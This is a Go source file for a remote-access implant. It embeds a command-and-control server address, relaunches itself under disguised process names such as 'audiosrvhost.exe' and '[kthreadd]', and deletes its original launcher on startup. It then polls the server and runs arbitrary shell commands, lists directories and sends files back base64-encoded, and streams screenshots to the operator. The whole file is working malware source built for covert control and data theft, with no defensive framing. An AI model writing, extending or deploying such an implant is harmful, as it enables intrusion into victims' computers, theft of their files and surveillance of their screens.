// implant/main.go
package main

import (
	"bytes"
	_ "embed"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

//go:embed placeholder.txt
var implantIDBytes []byte

//go:embed c2_address.txt
var c2AddressBytes []byte

const (
	implantIDPlaceholder = "deadbeef-0000-0000-0000-000000000000"
	c2AddressPlaceholder = "C2_IP_PLACEHOLDER_STRING_PADDING_TO_64_BYTES_XXXXXXXXXXXXXXXXXXXXX"
	checkInInterval      = 5 * time.Second
	livestreamInterval   = 1 * time.Second
	backgroundMarkerEnvVar = "IMPLANT_IS_BACKGROUND_XYZ123"      
	originalPathEnvVar     = "IMPLANT_ORIG_LAUNCHER_PATH_XYZ789" 
)

var (
	checkInURL         string
	commandsURL        string
	commandResultURL   string
	livestreamFrameURL string

	isLivestreamActive bool
	stopLivestreamChan chan struct{}

	gOriginalLauncherPath string 
)

var doSelfDelete func(selfExePath string, originalLauncherPath string)
var setOSSpecificAttrs func(cmd *exec.Cmd)
var takeScreenshot func() (string, error)

// Updated signature for relaunchAsDaemonInternal
var relaunchAsDaemonInternal func(exePath string, args []string, targetName string, bgMarkerEnvKey string, origPathEnvKey string, origPathValue string) error

func implantID() string {
	s := string(implantIDBytes)
	if nullIdx := strings.IndexByte(s, 0); nullIdx != -1 {
		s = s[:nullIdx]
	}
	return strings.TrimSpace(s)
}

func c2ServerAddress() string {
	s := string(c2AddressBytes)
	if nullIdx := strings.IndexByte(s, 0); nullIdx != -1 {
		s = s[:nullIdx]
	}
	return strings.TrimSpace(s)
}

type FileSystemEntry struct {
	Name        string    `json:"name"`
	IsDir       bool      `json:"is_dir"`
	Size        int64     `json:"size"`
	ModTime     time.Time `json:"mod_time"`
	Permissions string    `json:"permissions"`
	Path        string    `json:"path"`
}

type FileSystemListing struct {
	RequestedPath string            `json:"requested_path"`
	Entries       []FileSystemEntry `json:"entries"`
	Error         string            `json:"error,omitempty"`
}

type Command struct {
	ID      int    `json:"id"`
	Command string `json:"command"`
}

type CheckInPayload struct {
	ImplantID string `json:"implant_id"`
	IPAddress string `json:"ip_address"`
	PWD       string `json:"pwd"`
}

type CommandResultPayload struct {
	CommandID int    `json:"command_id"`
	Output    string `json:"output"`
}

type LivestreamFramePayload struct {
	ImplantID string `json:"implant_id"`
	FrameData string `json:"frame_data"`
}

func relaunchAsDaemon(exePath string, args []string, targetName string, bgMarkerEnvKey string, origPathEnvKey string, origPathValue string) error {
	if relaunchAsDaemonInternal != nil {
		return relaunchAsDaemonInternal(exePath, args, targetName, bgMarkerEnvKey, origPathEnvKey, origPathValue)
	}
	return fmt.Errorf("relaunchAsDaemonInternal not implemented for this platform: %s, cannot daemonize", runtime.GOOS)
}

func initializeConfig() bool {
	currentImplantID := implantID()
	currentC2Address := c2ServerAddress()

	if currentImplantID == "" || currentImplantID == implantIDPlaceholder {
		return false
	}
	if currentC2Address == "" || currentC2Address == c2AddressPlaceholder {
		return false
	}

	c2BaseURL := currentC2Address
	if !strings.HasPrefix(c2BaseURL, "http://") && !strings.HasPrefix(c2BaseURL, "https://") {
		c2BaseURL = "http://" + c2BaseURL
	}

	checkInURL = fmt.Sprintf("%s/checkin", c2BaseURL)
	commandsURL = fmt.Sprintf("%s/implant-client/%s/commands", c2BaseURL, currentImplantID)
	commandResultURL = fmt.Sprintf("%s/command-result", c2BaseURL)
	livestreamFrameURL = fmt.Sprintf("%s/livestream-frame", c2BaseURL)
	return true
}

func main() {
	exePath, err := os.Executable() 
	if err != nil {
		time.Sleep(10 * time.Second)
		os.Exit(1)
	}

	isBackgroundProcess := (os.Getenv(backgroundMarkerEnvVar) == "1")

	if !isBackgroundProcess {
		relaunchArgs := []string{} 

		var effectiveTargetProcessName string
		if runtime.GOOS == "windows" {
			effectiveTargetProcessName = "audiosrvhost.exe"
		} else if runtime.GOOS == "linux" {
			effectiveTargetProcessName = "[kthreadd]"
		} else {
			effectiveTargetProcessName = "implant_background_process"
		}

		relaunchErr := relaunchAsDaemon(exePath, relaunchArgs, effectiveTargetProcessName, backgroundMarkerEnvVar, originalPathEnvVar, exePath)
		if relaunchErr != nil {
			os.Exit(1)
		}
		os.Exit(0) // Initial launcher exits after successfully starting the backgrounded copy.
	}

	// Clear the background marker environment variable.
	os.Unsetenv(backgroundMarkerEnvVar)

	// Retrieve the original launcher path from the new originalPathEnvVar.
	gOriginalLauncherPath = os.Getenv(originalPathEnvVar)
	// Clear the original path environment variable for security.
	os.Unsetenv(originalPathEnvVar)

	if !initializeConfig() {
		time.Sleep(10 * time.Second)
		os.Exit(1)
	}

	// Schedule automatic self-deletion after startup
	if doSelfDelete != nil {
		// Start self-deletion process in background - delete both current executable and original launcher
		go func() {
			// Give the implant a moment to start up properly
			time.Sleep(1 * time.Second)
			doSelfDelete(exePath, gOriginalLauncherPath)
		}()
	}

	// Main operational loop
	for {
		checkIn()
		// Pass current exePath (of this backgrounded process) AND the original launcher's path
		fetchAndExecuteCommands(exePath, gOriginalLauncherPath)
		time.Sleep(checkInInterval)
	}
}

func checkIn() {
	if isLivestreamActive {
		return
	}
	currentPwd, err := os.Getwd()
	if err != nil {
		currentPwd = "error_getting_pwd: " + err.Error()
	}
	payload := CheckInPayload{
		ImplantID: implantID(),
		IPAddress: "", // IP can be obtained server-side
		PWD:       currentPwd,
	}
	jsonData, err := json.Marshal(payload)
	if err != nil {
		return
	}
	client := http.Client{Timeout: 10 * time.Second}
	resp, err := client.Post(checkInURL, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return
	}
	defer resp.Body.Close()
}

// Modified: fetchAndExecuteCommands now accepts originalLauncherPath
func fetchAndExecuteCommands(currentImplantExePath string, originalLauncherPath string) {
	client := http.Client{Timeout: 15 * time.Second}
	resp, err := client.Get(commandsURL)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return
	}

	var respStruct struct {
		Commands []Command `json:"commands"`
	}
	if err := json.Unmarshal(body, &respStruct); err != nil {
		return
	}

	currentImplantID := implantID()
	currentPwd, _ := os.Getwd()

	for _, cmdToExec := range respStruct.Commands {
		trimmedCmdStr := strings.TrimSpace(cmdToExec.Command)

		if strings.HasPrefix(trimmedCmdStr, "fs_browse ") {
			pathArgJSON := strings.TrimSpace(strings.TrimPrefix(trimmedCmdStr, "fs_browse "))
			var browseRequest struct {
				Path string `json:"path"`
			}
			var targetPath string
			if err := json.Unmarshal([]byte(pathArgJSON), &browseRequest); err == nil {
				targetPath = browseRequest.Path
			} else {
				targetPath = pathArgJSON
			}

			if targetPath == "" {
				errorListing := FileSystemListing{
					RequestedPath: pathArgJSON,
					Error:         "fs_browse: path argument is empty.",
				}
				jsonOutput, _ := json.Marshal(errorListing)
				sendOutput(cmdToExec.ID, string(jsonOutput))
				continue
			}

			var listing FileSystemListing
			var listErr error

			if targetPath == "__ROOTS__" {
				listing, listErr = listRoots()
				if listErr != nil {
					// If listRoots itself sets an error message in the listing, prefer that.
					// Otherwise, use the error returned.
					if listing.Error == "" {
						listing.Error = fmt.Sprintf("Error listing roots: %v", listErr)
					}
					// Ensure RequestedPath is set for consistency, even in error cases from listRoots
					if listing.RequestedPath == "" {
						listing.RequestedPath = targetPath
					}
				}
			} else {
				listing, listErr = listDirectory(targetPath)
				if listErr != nil {
					// If listDirectory itself sets an error message in the listing, prefer that.
					// Otherwise, use the error returned.
					if listing.Error == "" {
						listing.Error = fmt.Sprintf("Error listing directory '%s': %v", targetPath, listErr)
					}
					// Ensure RequestedPath is set for consistency
					if listing.RequestedPath == "" {
						listing.RequestedPath = targetPath
					}
				}
			}
			jsonOutput, _ := json.Marshal(listing) // Marshal the actual listing (or listing with error)
			sendOutput(cmdToExec.ID, string(jsonOutput))
			continue
		}

		if strings.HasPrefix(trimmedCmdStr, "fs_download ") {
			pathArgJSON := strings.TrimSpace(strings.TrimPrefix(trimmedCmdStr, "fs_download "))
			var downloadRequest struct {
				Path string `json:"path"`
			}
			var targetPath string
			if err := json.Unmarshal([]byte(pathArgJSON), &downloadRequest); err == nil {
				targetPath = downloadRequest.Path
			} else {
				targetPath = pathArgJSON
			}

			if targetPath == "" {
				sendOutput(cmdToExec.ID, "fs_download: path argument is empty.")
				continue
			}

			fileData, readErr := os.ReadFile(targetPath)
			if readErr != nil {
				sendOutput(cmdToExec.ID, fmt.Sprintf("fs_download: error reading file '%s': %v", targetPath, readErr))
				continue
			}
			encodedData := base64.StdEncoding.EncodeToString(fileData)
			sendOutput(cmdToExec.ID, "file_data_b64:"+encodedData)
			continue
		}

		if trimmedCmdStr == "livestream_start" {
			if isLivestreamActive {
				sendOutput(cmdToExec.ID, "Livestream is already active.")
			} else {
				isLivestreamActive = true
				stopLivestreamChan = make(chan struct{})
				go runLivestream(currentImplantID, stopLivestreamChan)
				sendOutput(cmdToExec.ID, "Livestream started.")
			}
			continue
		}

		if trimmedCmdStr == "livestream_stop" {
			if isLivestreamActive {
				isLivestreamActive = false
				if stopLivestreamChan != nil {
					close(stopLivestreamChan)
					stopLivestreamChan = nil
				}
				sendOutput(cmdToExec.ID, "Livestream stopped.")
			} else {
				sendOutput(cmdToExec.ID, "Livestream is not active.")
			}
			continue
		}

		if trimmedCmdStr == "screenshot" {
			if takeScreenshot == nil {
				sendOutput(cmdToExec.ID, "Screenshot function not available for this platform.")
				continue
			}
			outputBase64, ssErr := takeScreenshot()
			if ssErr != nil {
				sendOutput(cmdToExec.ID, fmt.Sprintf("Screenshot failed: %v", ssErr))
			} else {
				sendOutput(cmdToExec.ID, "screenshot_data:"+outputBase64)
			}
			continue
		}

		// MODIFIED: self_destruct command now uses both paths
		if trimmedCmdStr == "self_destruct" {
			sendOutput(cmdToExec.ID, "Self-destruct sequence initiated. Implant and original launcher (if path known) will be targeted for deletion.")
			if doSelfDelete != nil {
				// currentImplantExePath is the path of THIS running executable (e.g., the one in Temp if relaunched)
				// originalLauncherPath is the path of the initial .exe that was run
				doSelfDelete(currentImplantExePath, originalLauncherPath)
				// doSelfDelete has now initiated the deletion mechanisms (e.g., detached script, goroutine).
				// The current process must exit to allow these mechanisms to delete the files.
			}
			// Always exit after attempting to initiate self-destruct.
			// This allows the deletion mechanisms (like a detached script) to work on unlocked files.
			// If doSelfDelete was nil, this simply terminates the implant.
			os.Exit(0)
			// The 'continue' statement below is now unreachable, which is expected.
		}

		if strings.HasPrefix(trimmedCmdStr, "cd ") {
			targetDir := strings.TrimSpace(strings.TrimPrefix(trimmedCmdStr, "cd "))
			originalPwdForPrompt := currentPwd
			if targetDir == "" {
				homeDir, homeErr := os.UserHomeDir()
				if homeErr != nil {
					sendOutput(cmdToExec.ID, fmt.Sprintf("%s $ %s\ncd: Could not determine home directory: %s", originalPwdForPrompt, cmdToExec.Command, homeErr.Error()))
					continue
				}
				targetDir = homeDir
			}
			if strings.HasPrefix(targetDir, "~") {
				homeDir, homeErr := os.UserHomeDir()
				if homeErr == nil {
					targetDir = strings.Replace(targetDir, "~", homeDir, 1)
				}
			}
			targetDir = os.ExpandEnv(targetDir)

			cdErr := os.Chdir(targetDir)
			newPwd, _ := os.Getwd()
			currentPwd = newPwd

			prompt := fmt.Sprintf("%s $ %s\n", originalPwdForPrompt, cmdToExec.Command)
			if cdErr != nil {
				sendOutput(cmdToExec.ID, prompt+fmt.Sprintf("Error changing directory to '%s': %v", targetDir, cdErr))
			} else {
				sendOutput(cmdToExec.ID, prompt+fmt.Sprintf("Changed directory to: %s", newPwd))
			}
			continue
		}

		var command *exec.Cmd
		if runtime.GOOS == "windows" {
			command = exec.Command("cmd", "/C", trimmedCmdStr)
		} else {
			command = exec.Command("sh", "-c", trimmedCmdStr)
		}
		command.Dir = currentPwd
		if setOSSpecificAttrs != nil {
			setOSSpecificAttrs(command)
		}

		outputBytes, execErr := command.CombinedOutput()
		resultString := string(outputBytes)
		prompt := fmt.Sprintf("%s $ %s\n", currentPwd, cmdToExec.Command)
		if execErr != nil {
			resultString += "\nExecution Error: " + execErr.Error()
		}
		sendOutput(cmdToExec.ID, prompt+resultString)
	}
}

func sendOutput(cmdID int, output string) {
	payload := CommandResultPayload{
		CommandID: cmdID,
		Output:    output,
	}
	jsonData, err := json.Marshal(payload)
	if err != nil {
		return
	}
	client := http.Client{Timeout: 15 * time.Second}
	resp, err := client.Post(commandResultURL, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return
	}
	defer resp.Body.Close()
}

func runLivestream(implantToken string, localStopChan <-chan struct{}) {
	ticker := time.NewTicker(livestreamInterval)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			if !isLivestreamActive {
				return
			}
			if takeScreenshot == nil {
				isLivestreamActive = false // Stop livestream if capability is gone
				// Consider logging this event or sending a status to C2
				return
			}
			outputBase64, err := takeScreenshot()
			if err != nil {
				continue // Skip frame on error
			}
			sendLivestreamFrame(implantToken, outputBase64)

		case <-localStopChan:
			return
		}
	}
}

func sendLivestreamFrame(implantToken string, base64Data string) {
	payload := LivestreamFramePayload{
		ImplantID: implantToken,
		FrameData: base64Data,
	}
	jsonData, err := json.Marshal(payload)
	if err != nil {
		return
	}
	client := http.Client{Timeout: 5 * time.Second}
	resp, err := client.Post(livestreamFrameURL, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return
	}
	defer resp.Body.Close()
}
